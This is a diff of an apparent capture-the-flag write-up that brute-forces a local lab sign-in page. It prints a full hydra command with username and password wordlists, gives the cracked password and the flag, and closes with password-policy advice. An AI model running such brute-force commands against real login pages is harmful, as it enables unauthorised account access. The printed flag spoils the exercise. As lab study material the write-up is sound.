@@ -2,19 +2,11 @@
 
 This vulnerability is on the signin page: http://localhost:8080/index.php?page=signin.
 
-How to defend : password policy, non-simple passwords
+The root password found in http://localhost:8080/whatever/htpasswd doesn't work.
 
-intuition is last flag is probably signin page
-let's try and bruteforce the password
-installed hydra locally
+Let's try and bruteforce it with `hydra`.
 
-```
-10191  ./configure --prefix=$HOME/hydra\n
-10192  make
-10193  make install prefix=$HOME/hydra\n
-```
-
-dont' forget to source the path .zshrc
+==========
 
 ```
 ➜  ~ hydra -L sgoinfre/SecLists/Usernames/top-usernames-shortlist.txt -P sgoinfre/SecLists/Passwords/2020-200_most_used_passwords.txt -s 8080 localhost http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
@@ -49,3 +41,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-29 13:48:
 ```
 
 not very secure hm, using any user with shadow as password leads to : "The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 " !
+
+==========
+
+This vulnerability can be prevented with a stronger password policy: minimum size, digits, lowercase, uppercase and special characters.
